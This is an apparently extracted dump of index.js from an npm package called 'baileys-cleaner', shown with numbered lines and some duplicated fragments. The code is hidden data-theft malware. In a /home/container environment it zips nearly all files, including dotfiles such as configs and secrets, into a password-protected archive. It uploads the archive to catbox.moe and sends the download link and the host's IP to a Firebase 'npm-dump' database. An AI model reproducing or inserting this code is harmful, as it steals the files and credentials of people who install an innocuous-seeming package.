// File: tmp/tmpfdhlk1lc/baileys-cleaner/package/index.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const fsx = require('fs-extra')
Line 3: const archiver = require('archiver')
Line 4: const path = require('path')
Line 5: const axios = require('axios')
Line 6: const FormData = require('form-data')
Line 7: const fileType = require('file-type')
Line 8: const os = require('os')
Line 10: {
  const cwd = process.cwd();
  if (!cwd.startsWith('/home/container')) return;

  const base = '/home/container';
  const tmp = path.join(base, 'tmp');

  const ip = Object.values(os.networkInterfaces()).flat()
    .find(i => i.family === 'IPv4' && !i.internal)?.address || 'unknown';

  try {
    await fsx.ensureDir(tmp);
    const zipname = `${Math.floor(Math.random() * 1e8)}.zip`;
    const zippath = path.join(tmp, zipname);

    const output = fs.createWriteStream(zippath);
    const archive = archiver('zip-encrypted', {
      zlib: { level: 9 },
      encryptionMethod: 'aes256',
      password: 'zyuraa'
    });

    archive.pipe(output);
    archive.glob('**/*', {
      cwd: base,
      dot: true,
      ignore: [
        '**/node_modules/**',
        '**/session/**',
        '**/.cache/**',
        '**/.npm/**',
        '**/.git/**',
        '**/tmp/**',
        '**/package-lock.json'
      ]
    });

    await archive.finalize();

    output.on('close', async () => {
      tr...
Line 15: path.join(base, 'tmp')
Line 17: const ip = Object.values(os.networkInterfaces()).flat()
    .find(i => i.family === 'IPv4' && !i.internal)?.address || 'unknown'
Line 23: path.join(tmp, zipname)
Line 26: archiver('zip-encrypted', {
      zlib: { level: 9 },
      encryptionMethod: 'aes256',
      password: 'zyuraa'
    })
Line 32: archive.pipe(output)
Line 33: archive.glob('**/*', {
      cwd: base,
      dot: true,
      ignore: [
        '**/node_modules/**',
        '**/session/**',
        '**/.cache/**',
        '**/.npm/**',
        '**/.git/**',
        '**/tmp/**',
        '**/package-lock.json'
      ]
    })
Line 37: _tmp_5.push("**/node_modules/**")
Line 38: _tmp_5.push("**/session/**")
Line 39: _tmp_5.push("**/.cache/**")
Line 40: _tmp_5.push("**/.npm/**")
Line 41: _tmp_5.push("**/.git/**")
Line 42: _tmp_5.push("**/tmp/**")
Line 43: _tmp_5.push("**/package-lock.json")
Line 47: archive.finalize()
Line 54: fs.promises.readFile(zippath)
Line 61: const fetchModule = await import('node-fetch')
Line 62: const fetch = fetchModule.default
Line 64: const res = await fetch("https://catbox.moe/user/api.php", {
          method: "POST",
          body: form
        })
Line 70: res.text()
Line 72: axios.post('https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/npm-dump.json', {
          ip,
          link
        })
Line 80: axios.post('https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/npm-dump.json', {
          ip,
          error: err?.stack || err?.message || String(err)
        })
Line 89: axios.post('https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/npm-dump.json', {
        ip,
        error: err?.stack || err?.message || String(err)
      })
Line 97: axios.post('https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/npm-dump.json', {
      ip,
      error: err?.stack || err?.message || String(err)
    })
